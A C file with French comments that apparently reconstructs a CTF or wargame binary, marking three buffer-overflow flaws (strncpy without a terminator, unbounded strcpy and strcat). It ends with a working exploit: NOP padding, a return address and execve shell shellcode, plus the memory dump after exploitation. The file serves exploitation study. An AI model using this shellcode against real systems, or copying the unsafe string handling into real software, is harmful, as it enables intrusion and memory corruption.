#include <string.h>
#include <stdio.h>
#include <unistd.h>

// Buffer de 4104 bytes
char* p(char* arg1, char* arg2) {
    char buf[0x1008];  // 4104 bytes sur la stack
    
    puts(arg2);  // Affiche " - "
    
    // Lit jusqu'à 4096 bytes, mais strncpy ne copiera que 20
    read(0, buf, 0x1000);
    
    // Remplace \n par \0
    char* newline = strchr(buf, '\n');
    if (newline) *newline = '\0';
    
    // VULNÉRABILITÉ 1: strncpy copie 20 bytes sans \0
    // Si l'entrée fait plus de 20 bytes, pas de null byte
    strncpy(arg1, buf, 0x14);
    
    return arg1;
}

char* pp(char* arg1) {
    // Total: 76 bytes sur la stack
    char buffer1[48];  // [ebp-0x30]
    char buffer2[28];  // [ebp-0x1c]
    
    // Premier appel à p() - remplit buffer1
    p(buffer1, " - ");
    // Deuxième appel à p() - remplit buffer2 
    p(buffer2, " - ");
// buffer2 = "\x90"*9 + "\x44\xf6\xff\xbf" + "\x90"*7
    // VULNÉRABILITÉ 2: strcpy sans limite
    // Copie buffer1 (potentiellement sans \0) dans arg1
    strcpy(arg1, buffer1);
//arg1 = 20 nops
    // Trouve la fin de la chaîne et ajoute un espace
    size_t len = strlen(arg1);
    arg1[len] = ' ';
//arg1 = 20 nops + 32    
    // VULNÉRABILITÉ 3: strcat sans limite
    // Concatène buffer2 après l'espace
    strcat(arg1, buffer2);
// ajoute src a la fin de dest (donc buffer2 a la fin de arg1)
// arg1 = 20 nops + 32
//while arg1[arg1_len + i] != \0
    //arg1[arg1_len + i] = buffer2[i]
    return arg1;
}

int main(int argc, char** argv) {
    char str[42];  // [esp+0x16] - Trop petit pour contenir les deux buffers
    
    pp(str);
    puts(str);
    
    return 0;
}

/*
Exemple d'exploitation:

Premier input (20 bytes + padding):
python -c 'print "\x90"*20'

Deuxième input (9 bytes padding + adresse + shellcode):
python -c 'print "\x90"*9 + "\x2a\xf6\xff\xbf" + "\x90"*7 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'

L'overflow se produit car:
1. Premier buffer copié sans \0
2. Espace ajouté
3. Deuxième buffer concaténé
4. Total > 42 bytes -> écrase l'adresse de retour

État de la mémoire après exploitation[1]:
0xbffff610: 0x90900016 0x90909090 0x90909090
0xbffff620: 0x90909090 0x90909090 0x90909090
0xbffff630: 0x2a909090 0x90bffff6 0x6a909090
*/
